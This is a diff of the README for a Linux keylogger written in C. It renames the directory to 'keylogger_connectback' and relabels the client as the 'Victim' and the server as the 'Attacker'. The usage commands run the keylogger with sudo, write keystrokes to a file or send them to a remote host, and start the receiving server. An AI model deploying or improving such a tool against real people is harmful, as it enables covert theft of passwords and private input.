@@ -6,12 +6,12 @@ A simple keylogger for Linux written in C. The current version will attempt to d
 
 ## Usage
 
-### Client
+### Client (Victim)
 
 #### File
 
 ```bash
-cd keylog/
+cd keylogger_connectback/
 sudo ./keylog -f file-to-write-to.txt
 ```
 
@@ -20,19 +20,19 @@ This will log all keystrokes to the specified file while the program is running.
 #### Network
 
 ```bash
-cd keylog/
+cd keylogger_connectback/
 sudo ./keylog -n hostname
 ```
 
 This will send all keystrokes to the server running on `hostname`.
 
-### Server
-
+### Server (Attacker)
+You can disconnect the keylogger from the server side using Ctrl-C and terminate the server using Ctrl-*, where * is any character besides 'C'.
 
 #### stdout
 
 ```bash
-cd keylog/
+cd keylogger_connectback/
 ./server
 ```
 
@@ -41,7 +41,7 @@ This will write all keystrokes received from the client to stdout.
 #### File
 
 ```bash
-cd keylog/
+cd keylogger_connectback/
 ./server -f file-to-write-to.txt
 ```
 
@@ -54,7 +54,7 @@ chosen location, followed by a newline. When the program quits, an extra newline
 
 #### Example
 
-Typing `hello world` and then quitting the program with `Ctrl-C` will cause the chosen location to contain the following.
+Typing `hello world` and then quitting the program with `Ctrl-C' will cause the chosen location to contain the following.
 
 ```
 H
@@ -75,7 +75,7 @@ C
 ## Building
 
 ```bash
-cd keylog/
+cd keylogger_connectback/
 make
 ```
 
